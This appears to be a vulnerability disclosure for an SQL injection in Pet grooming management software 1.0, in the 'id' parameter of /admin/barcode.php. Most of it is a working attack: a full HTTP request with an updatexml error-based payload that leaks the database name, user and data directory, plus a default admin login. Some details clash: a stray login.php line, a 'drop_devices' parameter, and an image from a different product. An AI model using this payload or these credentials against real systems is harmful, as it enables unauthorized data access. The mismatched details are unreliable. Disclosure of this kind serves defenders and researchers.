

# Pet grooming management software - barcode.php '**id**' SQL inject

#### Exploit Title: Pet grooming management software - barcode.php 'id' SQL inject

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: [https://www.sourcecodester.com](https://www.sourcecodester.com/)

#### Software Link:https://www.sourcecodester.com/php/18340/pet-grooming-management-software-download.html

#### Version: Pet grooming management software 1.0

#### Tested on: Windows 10, Apache ,Mysql

#### Description

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Pet grooming management software does not filter the content correctly at the "barcode.php/id" parameter, resulting in the generation of SQL injection.

#### Payload used:

```POST /login.php HTTP/1.1
POST /admin/barcode.php HTTP/1.1
Host: 192.168.67.28:8021
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.67.28:8021/
Origin: http://192.168.67.28:8021
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Cookie: PHPSESSID=e68auo56o4aja1o1vp829pfesl
Cache-Control: max-age=0
Content-Length: 45

id=1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#
```

#### Proof of Concept

1、Log in to the system using the default password mdkhairnar92@gmail.com: admin

2、By examining the /admin/barcode.php code, it was discovered that the drop_devices parameter was concatenated in the SQL statement

![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/codebarcode.png)

3、We can construct SQL statements to query the name of the database and the name of  user

payload:`id=1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#`

![image](https://github.com/joinia/webray.com.cn/blob/main/Loan-Management-System/images/sqlbarcode.png)
